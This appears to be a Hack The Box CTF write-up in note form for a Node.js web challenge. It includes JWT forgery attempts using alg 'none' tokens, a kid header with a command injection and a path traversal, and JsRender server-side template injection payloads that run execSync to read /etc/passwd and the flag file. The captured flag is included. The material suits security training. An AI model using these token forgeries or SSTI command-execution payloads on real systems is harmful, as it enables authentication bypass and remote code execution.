# didactic-octo-paddles

**SOLVED**

> You have been hired by the Intergalactic Ministry of Spies to retrieve a powerful relic that is believed to be hidden within the small paddle shop, by the river. 
> You must hack into the paddle shop's system to obtain information on the relic's location. 
> Your ultimate challenge is to shut down the parasitic alien vessels and save humanity from certain destruction by retrieving the relic hidden within the Didactic Octo Paddles shop.

`178.62.9.10:30703`

Dockerfile -> node

sqllite

https://www.jsviews.com/#jsrapi

barrett/password

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaWF0IjoxNjc5Mjc5MzY4LCJleHAiOjE2NzkyODI5Njh9.PLIKsl0uEJh7ALZSUjxUIArBIx55i861KzMBWp8f4s4
```
{
    "id": 3,
    "iat": 1679279368,
    "exp": 1679282968
}
```

```sh

echo -n '{"typ":"JWT","alg":"none"}' | base64
# eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=

echo -n '{"typ":"JWT","alg":"None"}' | base64
# eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=

echo -n '{"typ":"JWT"}' | base64
# eyJ0eXAiOiJKV1QifQ

echo -n '{"id": 2, "iat": 1679286488, "exp": 1679290088}' | base64
# eyJpZCI6IDIsICJpYXQiOiAxNjc5Mjg2NDg4LCAiZXhwIjogMTY3OTI5MDA4OH0

echo -n '{"id":1,"iat":1679289631,"exp":1679293231}' | base64
# eyJpZCI6MSwiaWF0IjoxNjc5Mjg5NjMxLCJleHAiOjE2NzkyOTMyMzF9=

# id=2 (HS256)
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5Mjg3NzUzLCJleHAiOjE2NzkyOTEzNTN9

# id=2 (none)
# eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MiwiaWF0IjoxNjc5Mjg3NzUzLCJleHAiOjE2NzkyOTEzNTN9

# id=2 (undefined)
# eyJ0eXAiOiJKV1QifQ.eyJpZCI6MiwiaWF0IjoxNjc5Mjg3NzUzLCJleHAiOjE2NzkyOTEzNTN9




# id=1 (HS256)
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IDEsICJpYXQiOiAxNjc5Mjg2NDg4LCAiZXhwIjogMTY3OTI5MDA4OH0

# id=1 (none)
# eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6IDEsICJpYXQiOiAxNjc5Mjg2NDg4LCAiZXhwIjogMTY3OTI5MDA4OH0.SXCKbfR7-W9dh7_hAzhwQxvIBLuvftDIhrTebPkueS4

# id=1 (undefined)
# eyJ0eXAiOiJKV1QifQ.eyJpZCI6IDEsICJpYXQiOiAxNjc5Mjg2NDg4LCAiZXhwIjogMTY3OTI5MDA4OH0.SXCKbfR7-W9dh7_hAzhwQxvIBLuvftDIhrTebPkueS4

# id=1 (None)
# eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6IDEsICJpYXQiOiAxNjc5Mjg2NDg4LCAiZXhwIjogMTY3OTI5MDA4OH0

# id=1 (HS384)
# eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJpZCI6IDEsICJpYXQiOiAxNjc5Mjg2NDg4LCAiZXhwIjogMTY3OTI5MDA4OH0.SXCKbfR7-W9dh7_hAzhwQxvIBLuvftDIhrTebPkueS4

# id=1 (None, secret='hello')
# eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6IDEsICJpYXQiOiAxNjc5Mjg2NDg4LCAiZXhwIjogMTY3OTI5MDA4OH0.JluJfnZspWzAXnY1usJ2L7kZbLaySGtcAp52PZyhAmo87-pG8M4j4nIxXSw01NCU


# id=2 
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5Mjg5NjMxLCJleHAiOjE2NzkyOTMyMzF9.DaocbOd2vi6ehYBcRz0X4rk_ZT8lVfc2_hexXnREfJI

# id=1 None
# eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6MSwiaWF0IjoxNjc5Mjg5NjMxLCJleHAiOjE2NzkyOTMyMzF9.DaocbOd2vi6ehYBcRz0X4rk_ZT8lVfc2_hexXnREfJI


```

```sh
echo -n '{"typ":"JWT","alg":"none", "kid": "key1|/usr/bin/uname"}' | base64
# eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwgImtpZCI6ICJrZXkxfC91c3IvYmluL3VuYW1lIn0=

echo -n '{"typ":"JWT","alg":"none", "kid": "../../../../../../../dev/null"}' | base64
# eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwgImtpZCI6ICIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCJ9

echo -n '{"typ":"JWT","alg":"None", "kid": "../../../../../../../dev/null"}' | base64
# eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIiwgImtpZCI6ICIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCJ9

# id 1, None
# eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6MSwiaWF0IjoxNjc5Mjg5NjMxLCJleHAiOjE2NzkyOTMyMzF9.DaocbOd2vi6ehYBcRz0X4rk_ZT8lVfc2_hexXnREfJI
# eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6MSwiaWF0IjoxNjc5Mjg5NjMxLCJleHAiOjE2NzkyOTMyMzF9.OPcbSrMAveicacjPBJzFrXZ0z2JLyns2u5dYhFBbWi8

# id 1, none, kid dev/null
# eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwgImtpZCI6ICIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCJ9.eyJpZCI6MSwiaWF0IjoxNjc5Mjg5NjMxLCJleHAiOjE2NzkyOTMyMzF9.OPcbSrMAveicacjPBJzFrXZ0z2JLyns2u5dYhFBbWi8

# id 1, None, kid dev/null
# eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIiwgImtpZCI6ICIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCJ9.eyJpZCI6MSwiaWF0IjoxNjc5Mjg5NjMxLCJleHAiOjE2NzkyOTMyMzF9.OPcbSrMAveicacjPBJzFrXZ0z2JLyns2u5dYhFBbWi8
```

https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/



https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md#jwt-signature---null-signature-attack-cve-2020-28042

```sh
echo -n '{"typ":"JWT","alg":"None"}' | base64
# eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=

echo -n '{"id":1,"iat":1679289631,"exp":1679293231}' | base64
# eyJpZCI6MSwiaWF0IjoxNjc5Mjg5NjMxLCJleHAiOjE2NzkyOTMyMzF9

# id=1, alg=None
# eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6MSwiaWF0IjoxNjc5Mjg5NjMxLCJleHAiOjE2NzkyOTMyMzF9.

# id=2 base token
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5MjkyNDU2LCJleHAiOjE2NzkyOTYwNTZ9.xyMWAAZ6ahgndKhmZe-A3ApNsR0X1LLJtjIpl6dSoXc

# id=1, alg=None payload
# eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJpZCI6MSwiaWF0IjoxNjc5Mjg5NjMxLCJleHAiOjE2NzkyOTMyMzF9.
```

```
# registering SSTI users
# https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection#jsrender-nodejs

user={{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
password=password

user = {{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}
password = password
```

` HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}`
